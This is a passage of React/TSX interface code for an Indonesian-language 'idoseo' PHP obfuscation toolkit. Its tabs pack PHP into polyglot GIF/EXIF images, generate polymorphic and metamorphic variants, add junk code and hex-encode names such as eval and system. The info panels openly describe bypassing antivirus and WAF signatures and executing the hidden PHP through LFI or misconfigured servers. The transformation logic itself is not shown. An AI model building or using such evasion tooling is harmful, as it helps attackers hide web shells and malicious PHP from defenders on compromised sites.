                                <label className="text-xs text-slate-400 font-mono">Format Gambar Simulasi</label>
                                <div className="grid grid-cols-4 gap-2">
                                  {(['gif', 'png', 'jpeg', 'svg'] as const).map((fmt) => (
                                    <button
                                      key={fmt}
                                      type="button"
                                      onClick={() => setImageObfFormat(fmt)}
                                      className={`py-1.5 text-xs font-bold rounded border transition uppercase cursor-pointer ${
                                        imageObfFormat === fmt
                                          ? 'bg-blue-500/15 border-blue-500/40 text-blue-400'
                                          : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:bg-slate-900'
                                      }`}
                                    >
                                      {fmt}
                                    </button>
                                  ))}
                                </div>
                              </div>

                              <div className="space-y-1.5">
                                <label className="text-xs text-slate-400 font-mono">Metode Penyisipan Payload</label>
                                <div className="grid grid-cols-2 gap-2">
                                  <button
                                    type="button"
                                    onClick={() => setImageObfMethod('header')}
                                    disabled={imageObfFormat !== 'gif'}
                                    className={`py-1.5 text-xs font-bold rounded border transition cursor-pointer ${
                                      imageObfMethod === 'header'
                                        ? 'bg-blue-500/15 border-blue-500/40 text-blue-400'
                                        : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:bg-slate-900 disabled:opacity-40 disabled:cursor-not-allowed'
                                    }`}
                                  >
                                    Fake Image Header
                                  </button>
                                  <button
                                    type="button"
                                    onClick={() => setImageObfMethod('comment')}
                                    disabled={imageObfFormat !== 'gif'}
                                    className={`py-1.5 text-xs font-bold rounded border transition cursor-pointer ${
                                      imageObfMethod === 'comment'
                                        ? 'bg-blue-500/15 border-blue-500/40 text-blue-400'
                                        : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:bg-slate-900 disabled:opacity-40 disabled:cursor-not-allowed'
                                    }`}
                                  >
                                    EXIF Metadata
                                  </button>
                                </div>
                              </div>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            {/* INPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Kode PHP (Input)
                                </label>
                                <button
                                  onClick={() => setImageObfInput('')}
                                  className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer"
                                >
                                  Bersihkan
                                </button>
                              </div>
                              <textarea
                                value={imageObfInput}
                                onChange={(e) => setImageObfInput(e.target.value)}
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-300 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500"
                              />
                              <button
                                onClick={handleImageObfuscate}
                                className="w-full bg-blue-500 hover:bg-blue-600 text-slate-950 font-bold py-2.5 px-4 rounded-lg transition-all duration-150 flex items-center justify-center space-x-2 cursor-pointer text-sm shadow-lg shadow-blue-500/10"
                              >
                                <Image className="h-4 w-4" />
                                <span>Kemas Kode PHP Ke Dalam Gambar</span>
                              </button>
                            </div>

                            {/* OUTPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Polyglot Image Obfuscated (Output)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {imageObfOutput && (
                                    <button
                                      onClick={() => handleCopy(imageObfOutput, 'imageObfOutput')}
                                      className="text-xs text-slate-400 hover:text-blue-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer"
                                    >
                                      {copiedId === 'imageObfOutput' ? <Check className="h-3.5 w-3.5 text-blue-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>Salin</span>
                                    </button>
                                  )}
                                </div>
                              </div>
                              <textarea
                                readOnly
                                value={imageObfOutput}
                                placeholder="Hasil file gambar simulasi dengan payload PHP akan muncul di sini..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-blue-400 font-mono text-xs focus:outline-none"
                              />
                              <div className="bg-slate-950 border border-slate-800 rounded-lg p-3 text-[11px] text-slate-400 font-mono">
                                Status: <span className="text-blue-400 font-bold">READY</span> | Format Payload: <span className="text-white font-mono uppercase">{imageObfFormat}</span>
                              </div>
                            </div>
                          </div>

                          {imageObfError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{imageObfError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* INFO PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-blue-400" />
                            Mengapa Menggunakan Polyglot Image Obfuscator?
                          </h4>
                          <p>
                            Teknik polyglot membungkus kode scripting (PHP) di dalam struktur file format media biner yang valid. Ini memanfaatkan inkonsistensi interpreter file saat membaca metadata:
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Scanner statis (AV/WAF) seringkali mengabaikan file yang dimulai dengan "magic bytes" gambar asli (misalnya <code className="text-slate-300">GIF89a</code>).</li>
                            <li>Ketika diproses di web server dengan konfigurasi rentan atau via local file inclusion (LFI), interpreter PHP akan mengabaikan bytes gambar non-printable dan mengeksekusi script PHP di dalamnya secara mulus.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 14: PHP POLYMORPHIC OBFUSCATOR */}
                    {activeTab === 'php_polymorphic' && (
                      <motion.div
                        key="php_polymorphic"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Shuffle className="h-5 w-5 text-amber-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP Polymorphic Obfuscator</h2>
                                <p className="text-xs text-slate-400">Bangun mesin enkripsi dinamis yang menghasilkan kode unik berbeda pada setiap eksekusi obfuscation.</p>
                              </div>
                            </div>
                            <span className="text-xs text-slate-500 font-mono bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              idoseo Polymorphic
                            </span>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            {/* INPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Source Code PHP (Input)
                                </label>
                                <button
                                  onClick={() => setPolyInput('')}
                                  className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer"
                                >
                                  Bersihkan
                                </button>
                              </div>
                              <textarea
                                value={polyInput}
                                onChange={(e) => setPolyInput(e.target.value)}
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-300 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500"
                              />
                              <button
                                onClick={handlePolymorphicObfuscate}
                                className="w-full bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 border border-amber-500/30 font-bold py-2.5 px-4 rounded-lg transition-all duration-150 flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Shuffle className="h-4 w-4" />
                                <span>Buat Kode Polymorphic</span>
                              </button>
                            </div>

                            {/* OUTPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Polymorphic Script (Output)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {polyOutput && (
                                    <button
                                      onClick={() => handleCopy(polyOutput, 'polyOutput')}
                                      className="text-xs text-slate-400 hover:text-amber-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer"
                                    >
                                      {copiedId === 'polyOutput' ? <Check className="h-3.5 w-3.5 text-amber-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>Salin</span>
                                    </button>
                                  )}
                                </div>
                              </div>
                              <textarea
                                readOnly
                                value={polyOutput}
                                placeholder="Hasil polymorphic loop acak dengan dynamic key decryption akan tampil di sini..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-amber-400 font-mono text-xs focus:outline-none"
                              />
                              <div className="bg-slate-950 border border-slate-800 rounded-lg p-3 text-[11px] text-slate-400 font-mono">
                                Status: <span className="text-amber-400 font-bold">MUTATING KEYGEN</span> | Multi-Variable Scrambler
                              </div>
                            </div>
                          </div>

                          {polyError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{polyError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* INFO PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-amber-400" />
                            Konsep Dasar Kode Polymorphic
                          </h4>
                          <p>
                            Polymorphic code adalah kode program yang menggunakan mesin enkripsi bawaan (decryption engine) untuk mengubah penampakan fisiknya secara drastis setiap kali enkripsi dijalankan, tanpa mengubah logika aslinya:
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Setiap output menggunakan nama variabel acak unik (misal: <code className="text-slate-300">$p_f3x</code>, <code className="text-slate-300">$k_9as</code>) untuk menghancurkan pola penanda signature.</li>
                            <li>Kunci XOR generator berotasi secara dinamis sehingga byte biner ciphertext tidak pernah sama meskipun input source-nya identik.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 15: PHP METAMORPHIC OBFUSCATOR */}
                    {activeTab === 'php_metamorphic' && (
                      <motion.div
                        key="php_metamorphic"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Sparkles className="h-5 w-5 text-purple-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP Metamorphic Obfuscator (Instruction Mutator)</h2>
                                <p className="text-xs text-slate-400">Mutasikan struktur instruksi PHP secara langsung dengan menyisipkan logika semu junk dan restrukturisasi ekspresi boole.</p>
                              </div>
                            </div>
                            <span className="text-xs text-slate-500 font-mono bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              idoseo Metamorphic
                            </span>
                          </div>

                          {/* METAMORPHIC CONFIGURATION */}
                          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800/80 mb-6 space-y-3">
                            <div className="flex justify-between items-center text-xs">
                              <label className="font-bold text-slate-400 uppercase tracking-wider font-mono">Intensitas Mutasi Junk Code</label>
                              <span className="text-purple-400 font-mono font-bold">{metaIntensity}x Loop / Baris</span>
                            </div>
                            <input
                              type="range"
                              min="1"
                              max="10"
                              value={metaIntensity}
                              onChange={(e) => setMetaIntensity(parseInt(e.target.value))}
                              className="w-full h-1.5 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-purple-500"
                            />
                            <p className="text-[10px] text-slate-500 italic">Meningkatkan jumlah baris instruksi logika semu (dead code / junk instructions) untuk mengubah total checksum hash file (MD5/SHA256) secara acak.</p>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            {/* INPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Source Code PHP (Input)
                                </label>
                                <button
                                  onClick={() => setMetaInput('')}
                                  className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer"
                                >
                                  Bersihkan
                                </button>
                              </div>
                              <textarea
                                value={metaInput}
                                onChange={(e) => setMetaInput(e.target.value)}
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-300 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500"
                              />
                              <button
                                onClick={handleMetamorphicObfuscate}
                                className="w-full bg-purple-500/10 hover:bg-purple-500/20 text-purple-400 border border-purple-400/30 font-bold py-2.5 px-4 rounded-lg transition-all duration-150 flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Sparkles className="h-4 w-4" />
                                <span>Mutasikan Dengan Metamorphic</span>
                              </button>
                            </div>

                            {/* OUTPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Metamorphic Script (Output)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {metaOutput && (
                                    <button
                                      onClick={() => handleCopy(metaOutput, 'metaOutput')}
                                      className="text-xs text-slate-400 hover:text-purple-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer"
                                    >
                                      {copiedId === 'metaOutput' ? <Check className="h-3.5 w-3.5 text-purple-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>Salin</span>
                                    </button>
                                  )}
                                </div>
                              </div>
                              <textarea
                                readOnly
                                value={metaOutput}
                                placeholder="Struktur syntax yang telah termutasi penuh akan tampil di sini..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-purple-400 font-mono text-xs focus:outline-none"
                              />
                              <div className="bg-slate-950 border border-slate-800 rounded-lg p-3 text-[11px] text-slate-400 font-mono">
                                Status: <span className="text-purple-400 font-bold">MUTATED SUCCESFULLY</span> | True/False Replacement Active
                              </div>
                            </div>
                          </div>

                          {metaError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{metaError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* INFO PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-purple-400" />
                            Mengapa Metamorphic Code Begitu Efektif?
                          </h4>
                          <p>
                            Berbeda dari polymorphic yang sekedar membungkus kode asli di dalam loop dekripsi, metamorphic code membongkar dan merombak struktur fisik kode aslinya secara total:
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Ekspresi logika standar diganti (misal: merubah <code className="text-slate-300">true</code> menjadi ekspresi ekuivalen <code className="text-slate-300">(!0)</code>).</li>
                            <li>Menyisipkan variabel sampah (dead code) yang melakukan operasi matematika acak tanpa mengacaukan performa eksekusi utama.</li>
                            <li>Hasilnya memiliki tanda tangan biner (file hash signature) yang selalu berubah 100%, sangat menyulitkan deteksi berbasis hash biner statis.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 16: PHP ANTI-DETECTION & EVASION */}
                    {activeTab === 'php_evasion' && (
                      <motion.div
                        key="php_evasion"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Flame className="h-5 w-5 text-red-400 animate-pulse" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP Anti-Detection & Evasion (AV / WAF Bypass)</h2>
                                <p className="text-xs text-slate-400">Gunakan teknik fragmentasi array tingkat tinggi dan re-mapping fungsi dinamis untuk mengelabui filter deteksi malware dinamis.</p>
                              </div>
                            </div>
                            <span className="text-xs text-slate-500 font-mono bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              idoseo Evasion
                            </span>
                          </div>

                          {/* EVASION SETTINGS */}
                          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800/80 mb-6 space-y-4">
                            <div className="space-y-1.5">
                              <label className="text-xs text-slate-400 font-mono">Level Bypass Evasion</label>
                              <div className="grid grid-cols-2 gap-4">
                                <button
                                  type="button"
                                  onClick={() => setEvasionLevel('standard')}
                                  className={`flex flex-col text-left p-3 rounded-lg border transition ${
                                    evasionLevel === 'standard'
                                      ? 'bg-red-500/10 text-red-400 border-red-500/30'
                                      : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:bg-slate-900'
                                  }`}
                                >
                                  <span className="text-xs font-bold text-white mb-0.5">1. Standard Evasion</span>
                                  <span className="text-[10px] text-slate-400">Memisahkan pemanggilan nama fungsi string sensitif (seperti base64_decode) menggunakan teknik penggabungan array bertahap.</span>
                                </button>
                                <button
                                  type="button"
                                  onClick={() => setEvasionLevel('extreme')}
                                  className={`flex flex-col text-left p-3 rounded-lg border transition ${
                                    evasionLevel === 'extreme'
                                      ? 'bg-amber-500/10 text-amber-400 border-amber-500/30'
                                      : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:bg-slate-900'
                                  }`}
                                >
                                  <span className="text-xs font-bold text-white mb-0.5">2. Extreme Layered Fragmentation</span>
                                  <span className="text-[10px] text-slate-400">Membongkar seluruh base64 payload menjadi array substring terpecah berukuran kecil, menyusun ulang secara runtime menggunakan dynamic reflection offset.</span>
                                </button>
                              </div>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            {/* INPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Kode PHP Sensitif (Input)
                                </label>
                                <button
                                  onClick={() => setEvasionInput('')}
                                  className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer"
                                >
                                  Bersihkan
                                </button>
                              </div>
                              <textarea
                                value={evasionInput}
                                onChange={(e) => setEvasionInput(e.target.value)}
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-300 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500"
                              />
                              <button
                                onClick={handleEvasionObfuscate}
                                className="w-full bg-red-500 hover:bg-red-600 text-slate-950 font-bold py-2.5 px-4 rounded-lg transition-all duration-150 flex items-center justify-center space-x-2 cursor-pointer text-sm shadow-lg shadow-red-500/10"
                              >
                                <Flame className="h-4 w-4" />
                                <span>Bungkus Evasion Anti-Detection</span>
                              </button>
                            </div>

                            {/* OUTPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Evasion Wrapper (Output)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {evasionOutput && (
                                    <button
                                      onClick={() => handleCopy(evasionOutput, 'evasionOutput')}
                                      className="text-xs text-slate-400 hover:text-red-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer"
                                    >
                                      {copiedId === 'evasionOutput' ? <Check className="h-3.5 w-3.5 text-red-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>Salin</span>
                                    </button>
                                  )}
                                </div>
                              </div>
                              <textarea
                                readOnly
                                value={evasionOutput}
                                placeholder="Script dengan wrapping anti-detection array dinamis akan muncul di sini..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-red-400 font-mono text-xs focus:outline-none"
                              />
                              <div className="bg-slate-950 border border-slate-800 rounded-lg p-3 text-[11px] text-slate-400 font-mono">
                                Status: <span className="text-red-400 font-bold">DYNAMIC RE-MAPPED</span> | Signature Bypassed
                              </div>
                            </div>
                          </div>

                          {evasionError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{evasionError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* INFO PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-red-400" />
                            Bagaimana Mekanisme Anti-Detection Evasion?
                          </h4>
                          <p>
                            Sebagian besar antivirus modern dan filter Web Application Firewall (WAF) menggunakan regex statis untuk mendeteksi penanda script beresiko tinggi seperti pemanggilan langsung fungsi <code className="text-red-400">eval(base64_decode())</code>:
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Alat ini memotong string fungsi tersebut dan menginstansiasinya secara tidak langsung menggunakan dynamic reflection arrays.</li>
                            <li>Payload didekode secara dinamis di runtime memori tanpa meninggalkan jejak literal statis yang dapat dipetakan oleh sensor malware.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB: PHP JUNK CODE GENERATOR */}
                    {activeTab === 'php_junk_generator' && (
                      <motion.div
                        key="php_junk_generator"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Binary className="h-5 w-5 text-emerald-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP Junk Code Generator (Entropy Padder)</h2>
                                <p className="text-xs text-slate-400">Sisipkan instruksi, variabel, fungsi, atau kelas "junk" (dead code) tidak berguna untuk merubah signature biner, mengaburkan alur kontrol, dan meningkatkan nilai entropi file.</p>
                              </div>
                            </div>
                            <span className="text-xs text-slate-500 font-mono bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              idoseo JunkGen
                            </span>
                          </div>

                          {/* JUNK CODE SETTINGS */}
                          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800/80 mb-6 space-y-4">
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                              <div className="space-y-1.5">
                                <label className="text-xs text-slate-400 font-mono">Tipe Junk Code</label>
                                <div className="grid grid-cols-4 gap-2">
                                  {(['mixed', 'vars', 'functions', 'classes'] as const).map((t) => (
                                    <button
                                      key={t}
                                      type="button"
                                      onClick={() => setJunkType(t)}
                                      className={`py-1.5 text-xs font-bold rounded border transition uppercase cursor-pointer ${
                                        junkType === t
                                          ? 'bg-emerald-500/15 border-emerald-500/40 text-emerald-400'
                                          : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:bg-slate-900'
                                      }`}
                                    >
                                      {t === 'mixed' ? 'Campuran' : t}
                                    </button>
                                  ))}
                                </div>
                              </div>

                              <div className="space-y-1.5">
                                <div className="flex justify-between items-center text-xs">
                                  <label className="text-xs text-slate-400 font-mono">Jumlah Baris Junk</label>
                                  <span className="text-emerald-400 font-mono font-bold">{junkLinesCount} Baris</span>
                                </div>
                                <input
                                  type="range"
                                  min="5"
                                  max="100"
                                  step="5"
                                  value={junkLinesCount}
                                  onChange={(e) => setJunkLinesCount(parseInt(e.target.value))}
                                  className="w-full h-1.5 bg-slate-800 rounded-lg appearance-none cursor-pointer accent-emerald-500"
                                />
                              </div>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            {/* INPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Source Code PHP (Input)
                                </label>
                                <div className="flex items-center space-x-2">
                                  <label className="text-xs text-slate-400 hover:text-emerald-400 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer flex items-center space-x-1 hover:border-emerald-500/30">
                                    <Upload className="h-3 w-3" />
                                    <span>Unggah File</span>
                                    <input
                                      type="file"
                                      accept=".php,.txt"
                                      onChange={(e) => handleGenericFileUpload(e.target.files?.[0], setJunkInput, setJunkError)}
                                      className="hidden"
                                    />
                                  </label>
                                  <button
                                    onClick={() => setJunkInput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>
                              <textarea
                                value={junkInput}
                                onChange={(e) => setJunkInput(e.target.value)}
                                onDragOver={handleGenericDragOver}
                                onDrop={(e) => handleGenericDrop(e, setJunkInput, setJunkError)}
                                placeholder="Masukkan script PHP atau seret (drag & drop) file .php / .txt di sini..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-300 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500"
                              />
                              <button
                                onClick={handleJunkGenerate}
                                className="w-full bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-bold py-2.5 px-4 rounded-lg transition-all duration-150 flex items-center justify-center space-x-2 cursor-pointer text-sm shadow-lg shadow-emerald-500/10"
                              >
                                <Binary className="h-4 w-4" />
                                <span>Sisipkan Junk Code</span>
                              </button>
                            </div>

                            {/* OUTPUT */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Code + Junk Pad (Output)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {junkOutput && (
                                    <button
                                      onClick={() => handleCopy(junkOutput, 'junkOutput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 transition cursor-pointer"
                                    >
                                      {copiedId === 'junkOutput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>Salin</span>
                                    </button>
                                  )}
                                </div>
                              </div>
                              <textarea
                                readOnly
                                value={junkOutput}
                                placeholder="Hasil file PHP dengan sisipan junk code akan tampil di sini..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-emerald-400 font-mono text-xs focus:outline-none"
                              />
                              <div className="bg-slate-950 border border-slate-800 rounded-lg p-3 text-[11px] text-slate-400 font-mono">
                                Status: <span className="text-emerald-400 font-bold">READY</span> | Mode: <span className="text-white font-mono uppercase">{junkType}</span>
                              </div>
                            </div>
                          </div>

                          {junkError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{junkError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* INFO PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-emerald-400" />
                            Mekanisme & Kegunaan Junk Code (Dead Code)
                          </h4>
                          <p>
                            Junk Code Generator menyisipkan blok instruksi pemrograman acak (variabel, logika IF semu, kelas kosong, fungsi tidak terpakai) yang tidak akan merubah output fungsional dari program aslinya:
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Merusak penanda statis khas (static fingerprinting/WAF hashes) dengan mengubah struktur checksum file secara drastis.</li>
                            <li>Mengaburkan pembacaan manual (human reverse-engineering) karena menimbun kode penting asli di dalam tumpukan kode sampah yang menyesatkan.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB: STRING LITERAL TO CHAR/HEX CONVERTER */}
                    {activeTab === 'string_converter' && (
                      <motion.div
                        key="string_converter"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Hash className="h-5 w-5 text-amber-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">String Literal to Char/Hex Converter</h2>
                                <p className="text-xs text-slate-400">Konversikan string literal sensitif (seperti nama fungsi: "system", "eval", "assert", "base64_decode") menjadi representasi biner ASCII Char, Hexadesimal, atau Oktal agar tidak terbaca oleh filter regex string sederhana.</p>
                              </div>
                            </div>
                            <span className="text-xs text-slate-500 font-mono bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              idoseo StringConv
                            </span>
                          </div>

                          {/* STRING CONVERSION SETTINGS */}
                          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800/80 mb-6 space-y-4">
                            <div className="flex items-center justify-between gap-4">
                              <div className="space-y-0.5">
                                <label className="text-xs text-slate-300 font-mono font-bold flex items-center gap-1.5">
                                  Bungkus Sebagai PHP Executable (<code className="text-amber-400 font-mono">eval</code>)
                                </label>
